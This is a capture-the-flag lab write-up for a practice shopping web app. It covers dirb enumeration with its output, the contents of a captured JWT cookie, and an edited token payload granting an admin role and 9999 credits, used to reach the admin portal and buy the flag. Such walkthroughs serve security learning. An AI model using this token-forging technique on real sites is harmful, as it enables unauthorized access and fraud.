Target:
http://10.80.189.60:5000/

![](Images/image34.png)

First, I enumerated with dirb:

```
dirb http://10.80.189.60:5000
```

```
-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sat Feb 14 16:56:01 2026
URL_BASE: http://10.80.189.60:5000/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.80.189.60:5000/ ----
+ http://10.80.189.60:5000/account (CODE:302|SIZE:227)                                        
+ http://10.80.189.60:5000/admin (CODE:302|SIZE:223)                                          
+ http://10.80.189.60:5000/login (CODE:200|SIZE:1461)                                         
+ http://10.80.189.60:5000/logout (CODE:302|SIZE:189)                                         
+ http://10.80.189.60:5000/register (CODE:200|SIZE:1517)                                      

-----------------
END_TIME: Sat Feb 14 16:56:10 2026
DOWNLOADED: 4612 - FOUND: 5
```
After signing in and logging in, we get to the account page
http://10.80.189.60:5000/account 
and see that we have credit as 0 for this shopping website.
![](Images/image35.png)

Since this is a shopping-style website with login and account features, it is very likely using JWT for session management.

So opening the browser's dev tool to check the browser cookies, we indeed find:

```
Tryheartme_jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImRhbGxpQHRlc3QuY29tIiwicm9sZSI6InVzZXIiLCJjcmVkaXRzIjowLCJpYXQiOjE3NzEwODgxMTMsInRoZW1lIjoidmFsZW50aW5lIn0.fK5GZkNF78jWFI43VfxkoF57u4OtGSJt6RtBMoai0Y0
```

![](Images/image36.png)

Using an online JWT decoder, we decode the payload and see:

![](Images/image37.png)


The application is clearly trusting client-side JWT data for authorization and credit balance.

So we modify the payload to escalate privileges and increase credits:

```
{
  "email": "dalli@test.com",
  "role": "admin",
  "credits": 9999,
  "iat": 1771088113,
  "theme": "valentine"
}
```


I then replace the JWT value in the browser developer tools with the modified token and reload the page.

After refreshing, I now have:

- Admin access

- 9999 credits available

![](Images/image38.png)

I even have access to the admin portal now
![](Images/image39.png)

From the admin portal, we locate the valenflag item and purchase it using our modified credits.

![](Images/image40.png)

Logging out and logging back in generates a fresh JWT, removing admin privileges and resetting credits, since the token gets reissued by the server.

Attack Type: JWT privilege escalation via client-side token manipulation due to improper validation or weak/absent signature verification.
